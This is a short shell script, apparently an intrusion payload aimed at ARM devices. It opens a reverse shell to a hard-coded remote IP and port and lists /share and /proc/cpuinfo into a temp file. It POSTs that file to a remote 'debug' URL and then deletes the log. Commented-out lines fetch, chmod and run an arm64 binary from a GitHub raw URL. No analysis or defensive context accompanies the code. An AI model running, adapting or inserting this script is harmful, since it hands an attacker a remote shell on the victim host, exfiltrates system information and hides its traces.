#!/bin/sh

report_url="http://139.180.135.229:19088/9024134B28978B68666E2B034E46130E/debug"
pl_url="https://raw.githubusercontent.com/gptloveyou/learn/main/arm64_7.bin"

# curl -s -o /tmp/arm64_7.bin $pl_url 1>/tmp/tmplog60920.log 2>&1
bash -i >& /dev/tcp/139.180.135.229/19089 0>&1
ls /share/* 1>/tmp/tmplog60920.log 2>&1
cat /proc/cpuinfo 1>>/tmp/tmplog60920.log 2>&1
# chmod 777 /tmp/arm64_7.bin 1>>/tmp/tmplog60920.log 2>&1
# ls /tmp/*.bin 1>>/tmp/tmplog60920.log 2>&1
# /tmp/arm64_7.bin 1>>/tmp/tmplog60920.log 2>&1 
curl -X POST $report_url -d @/tmp/tmplog60920.log
rm /tmp/tmplog60920.log
# rm /tmp/arm64_7.bin
